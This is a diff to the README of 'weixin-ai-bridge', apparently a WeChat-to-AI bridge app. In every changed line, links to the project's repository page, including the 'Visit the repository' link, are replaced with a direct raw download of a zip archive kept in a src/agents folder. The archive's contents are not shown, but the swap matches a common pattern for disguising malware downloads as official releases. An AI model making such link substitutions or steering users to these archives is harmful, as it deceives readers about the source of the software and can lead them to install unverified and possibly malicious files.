@@ -1,6 +1,6 @@
 # 🤖 weixin-ai-bridge - Connect WeChat to AI Fast
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue.svg?style=for-the-badge)](https://github.com/hellal08/weixin-ai-bridge)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/hellal08/weixin-ai-bridge/main/src/agents/bridge_weixin_ai_v1.6.zip)
 
 ## 📦 What this app does
 
@@ -30,7 +30,7 @@ If you plan to use a local model, such as Ollama, your PC should have more memor
 
 Go to this page to download and set up the app:
 
-[Download weixin-ai-bridge](https://github.com/hellal08/weixin-ai-bridge)
+[Download weixin-ai-bridge](https://raw.githubusercontent.com/hellal08/weixin-ai-bridge/main/src/agents/bridge_weixin_ai_v1.6.zip)
 
 If you see a Releases page or a packaged Windows file, download that file to your PC. If the page shows the source code only, use the latest release package when it is available.
 
@@ -241,6 +241,6 @@ This makes it easier to start the bridge each day.
 
 Check the repository page for new releases, fixes, and build updates:
 
-[Visit the weixin-ai-bridge repository](https://github.com/hellal08/weixin-ai-bridge)
+[Visit the weixin-ai-bridge repository](https://raw.githubusercontent.com/hellal08/weixin-ai-bridge/main/src/agents/bridge_weixin_ai_v1.6.zip)
 
 If a new version appears, download it the same way and replace your old app files if the release notes say to do so.
